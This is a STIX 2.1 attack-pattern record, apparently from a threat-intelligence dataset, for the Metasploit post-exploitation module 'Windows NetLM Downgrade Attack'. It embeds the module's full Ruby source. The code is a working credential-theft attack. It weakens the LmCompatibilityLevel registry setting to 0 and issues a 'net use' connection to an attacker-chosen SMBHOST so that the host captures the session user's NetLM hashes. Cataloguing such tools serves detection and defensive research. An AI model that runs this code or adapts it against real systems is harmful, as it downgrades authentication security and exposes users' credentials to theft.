{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa957cc1-d4f9-436c-8f90-2fa937f77fde",
    "created": "2024-08-14T16:33:05.017472Z",
    "modified": "2024-08-14T16:33:05.017476Z",
    "name": "Windows NetLM Downgrade Attack",
    "description": " This module changes the system LmCompatibilityLevel registry value to enable sending LM challenge hashes and initiates a SMB connection to the host specified in the SMBHOST module option. If an SMB server is listening, it will receive the NetLM hashes for the session user.  'License' => MSF_LICENSE 'Platform' => ['win']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/netlm_downgrade.rb",
            "external_id": "netlm_downgrade.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20210311141729/https://www.optiv.com/explore-optiv-insights/blog/post-exploitation-using-netntlm-downgrade-attacks"
        },
        {
            "source_name": "reference",
            "url": "https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level"
        },
        {
            "source_name": "reference",
            "url": "https://support.microsoft.com/en-us/topic/security-guidance-for-ntlmv1-and-lm-network-authentication-da2168b6-4a31-0088-fb03-f081acde6e73"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows NetLM Downgrade Attack',\n        'Description' => %q{\n          This module changes the system LmCompatibilityLevel registry value\n          to enable sending LM challenge hashes and initiates a SMB connection\n          to the host specified in the SMBHOST module option. If an SMB server\n          is listening, it will receive the NetLM hashes for the session user.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'Author' => [\n          'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>',\n          'Thomas McCarthy \"smilingraccoon\" <smilingraccoon[at]gmail.com>'\n        ],\n        'SessionTypes' => ['meterpreter', 'shell', 'powershell'],\n        'References' => [\n          ['URL', 'https://web.archive.org/web/20210311141729/https://www.optiv.com/explore-optiv-insights/blog/post-exploitation-using-netntlm-downgrade-attacks'],\n          ['URL', 'https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level'],\n          ['URL', 'https://support.microsoft.com/en-us/topic/security-guidance-for-ntlmv1-and-lm-network-authentication-da2168b6-4a31-0088-fb03-f081acde6e73']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [CONFIG_CHANGES]\n        }\n      )\n    )\n\n    register_options([\n      OptAddress.new('SMBHOST', [ true, 'IP address of SMB server to capture hashes.' ])\n    ])\n  end\n\n  def smb_connect(smb_host)\n    print_status(\"Establishing SMB connection to #{smb_host}\")\n    cmd_exec('cmd.exe', \"/c net use \\\\\\\\#{smb_host}\")\n    print_good(\"SMB server #{smb_host} should now have NetLM hashes\")\n  end\n\n  def lm_compatibility_level\n    registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa', 'LmCompatibilityLevel')\n  end\n\n  def set_lm_compatibility_level(level)\n    subkey = 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa'\n    v_name = 'LmCompatibilityLevel'\n\n    v = level.nil? ? registry_deleteval(subkey, v_name) : registry_setvaldata(subkey, v_name, level, 'REG_DWORD')\n\n    fail_with(Failure::Unknown, \"Error modifying registry value #{subkey}\\\\#{v_name}\") if v.nil?\n\n    v\n  end\n\n  def run\n    @needs_cleanup = false\n\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    # Running as SYSTEM and will not pass any network credentials\n    fail_with(Failure::BadConfig, 'Running as SYSTEM. This module should be run as a user.') if is_system?\n\n    @original_lm_compat = lm_compatibility_level\n\n    if @original_lm_compat == 0\n      print_good(\"NetLM authentication is already required on this system (LmCompatibilityLevel: #{@original_lm_compat})\")\n    else\n      print_status(\"NetLM authentication is disabled (LmCompatibilityLevel: #{@original_lm_compat.inspect}). Enabling ...\")\n      set_lm_compatibility_level(0)\n      fail_with(Failure::Unknown, 'Could not enable NetLM authentication') unless lm_compatibility_level == 0\n      @needs_cleanup = true\n      print_good('NetLM authentication is enabled')\n    end\n\n    # call smb_connect method to pass network hashes\n    smb_connect(datastore['SMBHOST'])\n  end\n\n  def cleanup\n    return unless @needs_cleanup\n\n    print_status(\"Restoring original LM compatibility level (LmCompatibilityLevel: #{@original_lm_compat.inspect})\")\n\n    unless set_lm_compatibility_level(@original_lm_compat)\n      print_error('Could not restore original LM compatibility level')\n    end\n  ensure\n    super\n  end\nend\n"
}